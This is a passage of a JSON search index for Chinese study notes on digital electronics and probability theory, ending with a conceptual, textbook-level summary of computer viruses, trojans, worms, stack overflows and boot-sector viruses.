#","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/#\u7ec4\u5408\u903b\u8f91\u7535\u8def","text":"","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/#\u7ec4\u5408\u903b\u8f91\u7535\u8def\u5206\u6790","text":"","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/#\u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1","text":"","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E8%A7%A6%E5%8F%91%E5%99%A8/","text":"\u89e6\u53d1\u5668 # \u89e6\u53d1\u5668\u7684\u89e6\u53d1\u65b9\u5f0f # \u5f53\u5b83\u88ab\u7279\u5b9a\u4fe1\u53f7\u89e6\u53d1\u65f6\uff0c\u8f93\u51fa\u53d1\u751f\u53d8\u5316\u3002\u89e6\u53d1\u5668\u7684\u8f93\u51fa\u662f\u7531\u5f53\u524d\u72b6\u6001\u548c\u5f53\u524d\u8f93\u5165\u51b3\u5b9a\u7684\u3002 RD\u662f\u9ad8\u7535\u5e73\u6709\u6548\u7f6e0\uff0cSD\u662f\u9ad8\u7535\u5e73\u6709\u6548\u7f6e1 RS\u89e6\u53d1\u5668 D\u89e6\u53d1\u5668 JK\u89e6\u53d1\u5668 T\u89e6\u53d1\u5668","title":"\u89e6\u53d1\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E8%A7%A6%E5%8F%91%E5%99%A8/#\u89e6\u53d1\u5668","text":"","title":"\u89e6\u53d1\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E8%A7%A6%E5%8F%91%E5%99%A8/#\u89e6\u53d1\u5668\u7684\u89e6\u53d1\u65b9\u5f0f","text":"\u5f53\u5b83\u88ab\u7279\u5b9a\u4fe1\u53f7\u89e6\u53d1\u65f6\uff0c\u8f93\u51fa\u53d1\u751f\u53d8\u5316\u3002\u89e6\u53d1\u5668\u7684\u8f93\u51fa\u662f\u7531\u5f53\u524d\u72b6\u6001\u548c\u5f53\u524d\u8f93\u5165\u51b3\u5b9a\u7684\u3002 RD\u662f\u9ad8\u7535\u5e73\u6709\u6548\u7f6e0\uff0cSD\u662f\u9ad8\u7535\u5e73\u6709\u6548\u7f6e1 RS\u89e6\u53d1\u5668 D\u89e6\u53d1\u5668 JK\u89e6\u53d1\u5668 T\u89e6\u53d1\u5668","title":"\u89e6\u53d1\u5668\u7684\u89e6\u53d1\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/","text":"\u8fdb\u5236\u8f6c\u6362 #","title":"\u8fdb\u5236\u8f6c\u6362"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/#\u8fdb\u5236\u8f6c\u6362","text":"","title":"\u8fdb\u5236\u8f6c\u6362"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0/","text":"\u903b\u8f91\u4ee3\u6570 # \u903b\u8f91\u8fd0\u7b97\u53ca\u903b\u8f91\u95e8 # \u89c4\u5219\u53ca\u5e38\u7528\u5f62\u5f0f #","title":"\u903b\u8f91\u4ee3\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0/#\u903b\u8f91\u4ee3\u6570","text":"","title":"\u903b\u8f91\u4ee3\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0/#\u903b\u8f91\u8fd0\u7b97\u53ca\u903b\u8f91\u95e8","text":"","title":"\u903b\u8f91\u8fd0\u7b97\u53ca\u903b\u8f91\u95e8"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0/#\u89c4\u5219\u53ca\u5e38\u7528\u5f62\u5f0f","text":"","title":"\u89c4\u5219\u53ca\u5e38\u7528\u5f62\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E9%9B%86%E6%88%90%E8%AE%A1%E6%95%B0%E5%99%A8/","text":"\u96c6\u6210\u8ba1\u6570\u5668 # \u5e38\u7528\u96c6\u6210\u8ba1\u6570\u5668\u5206\u6790 # \u96c6\u6210\u8ba1\u6570\u5668\u5e94\u7528 #","title":"\u96c6\u6210\u8ba1\u6570\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E9%9B%86%E6%88%90%E8%AE%A1%E6%95%B0%E5%99%A8/#\u96c6\u6210\u8ba1\u6570\u5668","text":"","title":"\u96c6\u6210\u8ba1\u6570\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E9%9B%86%E6%88%90%E8%AE%A1%E6%95%B0%E5%99%A8/#\u5e38\u7528\u96c6\u6210\u8ba1\u6570\u5668\u5206\u6790","text":"","title":"\u5e38\u7528\u96c6\u6210\u8ba1\u6570\u5668\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%94%B5/%E9%9B%86%E6%88%90%E8%AE%A1%E6%95%B0%E5%99%A8/#\u96c6\u6210\u8ba1\u6570\u5668\u5e94\u7528","text":"","title":"\u96c6\u6210\u8ba1\u6570\u5668\u5e94\u7528"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%B8%80%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/","text":"\u4e00\u7ef4\u968f\u673a\u53d8\u91cf # \u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf # \u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf #","title":"\u4e00\u7ef4\u968f\u673a\u53d8\u91cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%B8%80%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/#\u4e00\u7ef4\u968f\u673a\u53d8\u91cf","text":"","title":"\u4e00\u7ef4\u968f\u673a\u53d8\u91cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%B8%80%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/#\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf","text":"","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%B8%80%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/#\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf","text":"","title":"\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%8B%E4%BB%B6%E8%BF%90%E7%AE%97%E5%8F%8A%E6%A6%82%E7%8E%87/","text":"\u4e8b\u4ef6\u8fd0\u7b97\u53ca\u6982\u7387 #","title":"\u4e8b\u4ef6\u8fd0\u7b97\u53ca\u6982\u7387"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%8B%E4%BB%B6%E8%BF%90%E7%AE%97%E5%8F%8A%E6%A6%82%E7%8E%87/#\u4e8b\u4ef6\u8fd0\u7b97\u53ca\u6982\u7387","text":"","title":"\u4e8b\u4ef6\u8fd0\u7b97\u53ca\u6982\u7387"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E8%AE%A1%E7%AE%97/","text":"\u4e8c\u91cd\u79ef\u5206\u7684\u8ba1\u7b97 # \u76f4\u89d2\u5750\u6807\u7cfb\u4e0b #","title":"\u4e8c\u91cd\u79ef\u5206\u7684\u8ba1\u7b97"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E8%AE%A1%E7%AE%97/#\u4e8c\u91cd\u79ef\u5206\u7684\u8ba1\u7b97","text":"","title":"\u4e8c\u91cd\u79ef\u5206\u7684\u8ba1\u7b97"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86%E7%9A%84%E8%AE%A1%E7%AE%97/#\u76f4\u89d2\u5750\u6807\u7cfb\u4e0b","text":"","title":"\u76f4\u89d2\u5750\u6807\u7cfb\u4e0b"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%94%E7%A7%8D%E9%87%8D%E8%A6%81%E5%88%86%E5%B8%83/","text":"\u4e94\u79cd\u91cd\u8981\u5206\u5e03 # \u79bb\u6563\u578b - \u4e8c\u9879\u5206\u5e03 # \u79bb\u6563\u578b - \u6cca\u677e\u5206\u5e03 # \u8fde\u7eed\u578b - \u5747\u5300\u5206\u5e03 # \u8fde\u7eed\u578b - \u6307\u6570\u5206\u5e03 # \u8fde\u7eed\u578b - \u6b63\u6001\u5206\u5e03 #","title":"\u4e94\u79cd\u91cd\u8981\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%94%E7%A7%8D%E9%87%8D%E8%A6%81%E5%88%86%E5%B8%83/#\u4e94\u79cd\u91cd\u8981\u5206\u5e03","text":"","title":"\u4e94\u79cd\u91cd\u8981\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%94%E7%A7%8D%E9%87%8D%E8%A6%81%E5%88%86%E5%B8%83/#\u79bb\u6563\u578b---\u4e8c\u9879\u5206\u5e03","text":"","title":"\u79bb\u6563\u578b - \u4e8c\u9879\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%94%E7%A7%8D%E9%87%8D%E8%A6%81%E5%88%86%E5%B8%83/#\u79bb\u6563\u578b---\u6cca\u677e\u5206\u5e03","text":"","title":"\u79bb\u6563\u578b - \u6cca\u677e\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%94%E7%A7%8D%E9%87%8D%E8%A6%81%E5%88%86%E5%B8%83/#\u8fde\u7eed\u578b---\u5747\u5300\u5206\u5e03","text":"","title":"\u8fde\u7eed\u578b - \u5747\u5300\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%94%E7%A7%8D%E9%87%8D%E8%A6%81%E5%88%86%E5%B8%83/#\u8fde\u7eed\u578b---\u6307\u6570\u5206\u5e03","text":"","title":"\u8fde\u7eed\u578b - \u6307\u6570\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E4%BA%94%E7%A7%8D%E9%87%8D%E8%A6%81%E5%88%86%E5%B8%83/#\u8fde\u7eed\u578b---\u6b63\u6001\u5206\u5e03","text":"","title":"\u8fde\u7eed\u578b - \u6b63\u6001\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%88%86%E5%B8%83%E7%A7%AF%E5%88%86%E6%B3%95/","text":"","title":"\u5206\u5e03\u79ef\u5206\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/","text":"\u53c2\u6570\u4f30\u8ba1 # \u77e9\u4f30\u8ba1 # \u6700\u5927\u4f3c\u7136\u4f30\u8ba1 # \u65e0\u504f\u4f30\u8ba1 #","title":"\u53c2\u6570\u4f30\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#\u53c2\u6570\u4f30\u8ba1","text":"","title":"\u53c2\u6570\u4f30\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#\u77e9\u4f30\u8ba1","text":"","title":"\u77e9\u4f30\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#\u6700\u5927\u4f3c\u7136\u4f30\u8ba1","text":"","title":"\u6700\u5927\u4f3c\u7136\u4f30\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#\u65e0\u504f\u4f30\u8ba1","text":"","title":"\u65e0\u504f\u4f30\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/","text":"\u62bd\u6837\u5206\u5e03 # \u5e38\u7528\u7edf\u8ba1\u91cf\u53ca\u6027\u8d28 # \u4e09\u79cd\u5e38\u89c1\u5206\u5e03 #","title":"\u62bd\u6837\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/#\u62bd\u6837\u5206\u5e03","text":"","title":"\u62bd\u6837\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/#\u5e38\u7528\u7edf\u8ba1\u91cf\u53ca\u6027\u8d28","text":"","title":"\u5e38\u7528\u7edf\u8ba1\u91cf\u53ca\u6027\u8d28"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/#\u4e09\u79cd\u5e38\u89c1\u5206\u5e03","text":"","title":"\u4e09\u79cd\u5e38\u89c1\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B%E3%80%81%E6%96%B9%E5%B7%AE%E3%80%81%E5%8D%8F%E6%96%B9%E5%B7%AE/","text":"\u6570\u5b66\u671f\u671b\u3001\u65b9\u5dee\u3001\u534f\u65b9\u5dee # \u4e00\u7ef4\u968f\u673a\u53d8\u91cf\u671f\u671b\u4e0e\u65b9\u5dee # \u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u671f\u671b\u4e0e\u65b9\u5dee # \u534f\u65b9\u5dee # \u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f #","title":"\u6570\u5b66\u671f\u671b\u3001\u65b9\u5dee\u3001\u534f\u65b9\u5dee"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B%E3%80%81%E6%96%B9%E5%B7%AE%E3%80%81%E5%8D%8F%E6%96%B9%E5%B7%AE/#\u6570\u5b66\u671f\u671b\u65b9\u5dee\u534f\u65b9\u5dee","text":"","title":"\u6570\u5b66\u671f\u671b\u3001\u65b9\u5dee\u3001\u534f\u65b9\u5dee"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B%E3%80%81%E6%96%B9%E5%B7%AE%E3%80%81%E5%8D%8F%E6%96%B9%E5%B7%AE/#\u4e00\u7ef4\u968f\u673a\u53d8\u91cf\u671f\u671b\u4e0e\u65b9\u5dee","text":"","title":"\u4e00\u7ef4\u968f\u673a\u53d8\u91cf\u671f\u671b\u4e0e\u65b9\u5dee"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B%E3%80%81%E6%96%B9%E5%B7%AE%E3%80%81%E5%8D%8F%E6%96%B9%E5%B7%AE/#\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u671f\u671b\u4e0e\u65b9\u5dee","text":"","title":"\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u671f\u671b\u4e0e\u65b9\u5dee"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B%E3%80%81%E6%96%B9%E5%B7%AE%E3%80%81%E5%8D%8F%E6%96%B9%E5%B7%AE/#\u534f\u65b9\u5dee","text":"","title":"\u534f\u65b9\u5dee"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B%E3%80%81%E6%96%B9%E5%B7%AE%E3%80%81%E5%8D%8F%E6%96%B9%E5%B7%AE/#\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f","text":"","title":"\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%9D%A1%E4%BB%B6%E6%A6%82%E7%8E%87%EF%BC%8C%E5%85%A8%E6%A6%82%E7%8E%87%EF%BC%8C%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%85%AC%E5%BC%8F/","text":"\u6761\u4ef6\u6982\u7387\uff0c\u5168\u6982\u7387\uff0c\u8d1d\u53f6\u65af\u516c\u5f0f #","title":"\u6761\u4ef6\u6982\u7387\uff0c\u5168\u6982\u7387\uff0c\u8d1d\u53f6\u65af\u516c\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%9D%A1%E4%BB%B6%E6%A6%82%E7%8E%87%EF%BC%8C%E5%85%A8%E6%A6%82%E7%8E%87%EF%BC%8C%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%85%AC%E5%BC%8F/#\u6761\u4ef6\u6982\u7387\u5168\u6982\u7387\u8d1d\u53f6\u65af\u516c\u5f0f","text":"","title":"\u6761\u4ef6\u6982\u7387\uff0c\u5168\u6982\u7387\uff0c\u8d1d\u53f6\u65af\u516c\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%A6%82%E7%8E%87%E8%AE%BA/","text":"\u6982\u7387\u8bba Overview # type: folder_brief_live style: strip noteOnly: true","title":"\u6982\u7387\u8bba Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%A6%82%E7%8E%87%E8%AE%BA/#\u6982\u7387\u8bba-overview","text":"type: folder_brief_live style: strip noteOnly: true","title":"\u6982\u7387\u8bba Overview"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E7%A6%BB%E6%95%A3%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/","text":"\u79bb\u6563\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf #","title":"\u79bb\u6563\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E7%A6%BB%E6%95%A3%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/#\u79bb\u6563\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf","text":"","title":"\u79bb\u6563\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E8%BF%9E%E7%BB%AD%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/","text":"\u8fde\u7eed\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf # \u6982\u7387\u5bc6\u5ea6 #","title":"\u8fde\u7eed\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E8%BF%9E%E7%BB%AD%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/#\u8fde\u7eed\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf","text":"","title":"\u8fde\u7eed\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E8%BF%9E%E7%BB%AD%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F/#\u6982\u7387\u5bc6\u5ea6","text":"","title":"\u6982\u7387\u5bc6\u5ea6"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E8%BF%9E%E7%BB%AD%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E5%B8%83/","text":"\u8fde\u7eed\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03 # Z=X+Y\u5206\u5e03 # Z=XY\u5206\u5e03 # Z=max{X,Y}\u5206\u5e03 #","title":"\u8fde\u7eed\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E8%BF%9E%E7%BB%AD%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E5%B8%83/#\u8fde\u7eed\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03","text":"","title":"\u8fde\u7eed\u578b\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E8%BF%9E%E7%BB%AD%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E5%B8%83/#zxy\u5206\u5e03","text":"","title":"Z=X+Y\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E8%BF%9E%E7%BB%AD%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E5%B8%83/#zxy\u5206\u5e03_1","text":"","title":"Z=XY\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E8%BF%9E%E7%BB%AD%E5%9E%8B%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E5%B8%83/#zmaxxy\u5206\u5e03","text":"","title":"Z=max{X,Y}\u5206\u5e03"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E6%80%BB%E7%BB%93/","text":"\u75c5\u6bd2 \u75c5\u6bd2\u5b9a\u4e49\uff1a\u5177\u6709\u81ea\u6211\u611f\u67d3\u529f\u80fd \u75c5\u6bd2\u540d\uff1a\u524d\u7f00\uff1a\u64cd\u4f5c\u5e73\u53f0\u6216\u75c5\u6bd2\u7c7b\u578b \u75c5\u6bd2\u540d/\u75c5\u6bd2\u5bb6\u65cf \u540e\u7f00\u5bb6\u65cf\u91cc\u7684\u53d8\u79cd \u7279\u5f81\uff1a\u4f20\u67d3\u6027 \u6f5c\u4f0f\u6027 \u9690\u853d\u6027 \u7834\u574f\u6027 \u6728\u9a6c \u7ed3\u6784\uff1a\u914d\u7f6e\u7a0b\u5e8f \u6728\u9a6c\u7a0b\u5e8f \u63a7\u5236\u7a0b\u5e8f \u901a\u4fe1\u901a\u9053\uff1a tcp udp http icmp \u7aef\u53e3\u590d\u7528 / \u62a5\u6587\u4f2a\u88c5 \u9690\u85cf\u65b9\u5f0f\uff1a \u4fee\u6539\u56fe\u6807 \u4f2a\u9020\u540d\u5b57 \u6346\u7ed1\u6587\u4ef6 \u81ea\u6211\u9500\u6bc1 \u8815\u866b \u6982\u5ff5\uff1a\u53ef\u4ee5\u4ece\u4e00\u53f0\u8ba1\u7b97\u673a\u79fb\u52a8\u5230\u53e6\u5916\u4e00\u53f0\u8ba1\u7b97\u673a\uff0c\u81ea\u6211\u590d\u5236\u6027 \u4e0e\u75c5\u6bd2\u7684\u533a\u522b\uff1a\u75c5\u6bd2\u9700\u8981\u501f\u52a9\u6d3b\u52a8\u7684\u5bbf\u4e3b\u7a0b\u5e8f\u6216\u8005\u4ee5\u611f\u67d3\u7684\u6d3b\u52a8\u64cd\u4f5c\u624d\u80fd\u8fd0\u884c\uff0c\u8815\u866b\u662f\u72ec\u7acb\u7684\u6076\u610f\u7a0b\u5e8f\uff0c \u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\u673a\u7f51\u7edc\u8fdb\u884c\u81ea\u6211\u590d\u5236\u548c\u4f20\u64ad \u6808\u6ea2\u51fa\u539f\u7406\uff1a \u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u4e2d\u5bf9\u4ee3\u7801\u548c\u6570\u636e\u91c7\u7528\u7edf\u4e00\u7f16\u7801\uff0c\u6ca1\u6709\u4e25\u683c\u533a\u5206\u3002 \u7f13\u51b2\u533a\u6ea2\u51fa\u5c31\u662f\u4e0d\u987e\u5806\u6808\u4e2d\u5206\u914d\u7684\u5c40\u90e8\u6570\u636e\u5757\u5927\u5c0f\uff0c\u5411\u8be5\u6570\u636e\u5757\u5199\u5165\u4e86\u8f83\u591a\u7684\u6570\u636e\uff0c\u5bfc\u81f4\u6570\u636e\u8d8a\u754c\uff0c\u8986\u76d6\u4e86\u8001\u7684\u5806\u6808\u6570\u636e\u3002 \u5229\u7528\uff1a \u901a\u8fc7\u8986\u76d6\u51fd\u6570\u8fd4\u56de\u5730\u5740\uff0c\u8ba9\u5176\u8df3\u8f6c\u5230\u9884\u5148\u5b9a\u4e49\u597d\u7684\u6076\u610f\u5730\u5740\u4ece\u800c\u6267\u884c\u6211\u4eec\u6307\u5b9a\u7684\u6076\u610f\u4ee3\u7801\u3002 shellcode\u662f\u6307\u80fd\u591f\u5b8c\u6210\u7279\u6b8a\u4efb\u52a1\u7684\u81ea\u5305\u542b\u4e8c\u8fdb\u5236\u4ee3\u7801\uff0c\u5176\u6700\u7ec8\u76ee\u7684\u662f\u83b7\u5f97\u76ee\u6807\u673a\u5668\u7684\u63a7\u5236\u6743\u3002 \u5f15\u5bfc\u578b\u75c5\u6bd2\uff1a \u4e3b\u5f15\u5bfc\u8bb0\u5f55\uff1a \u4e3b\u5f15\u5bfc\u6247\u533a\u4ee3\u7801\uff1a\u627e\u51fa\u5f53\u524d\u7684\u6d3b\u52a8\u5206\u533a\uff0c\u5c06\u63a7\u5236\u6743\u8f6c\u7ed9\u8be5\u5206\u533a\u7684\u5f15\u5bfc\u8bb0\u5f55 \u4e3b\u5206\u533a\u8868\uff1a\u4fdd\u5b584\u4e2a\u5206\u533a\u7684\u4fe1\u606f\u3002 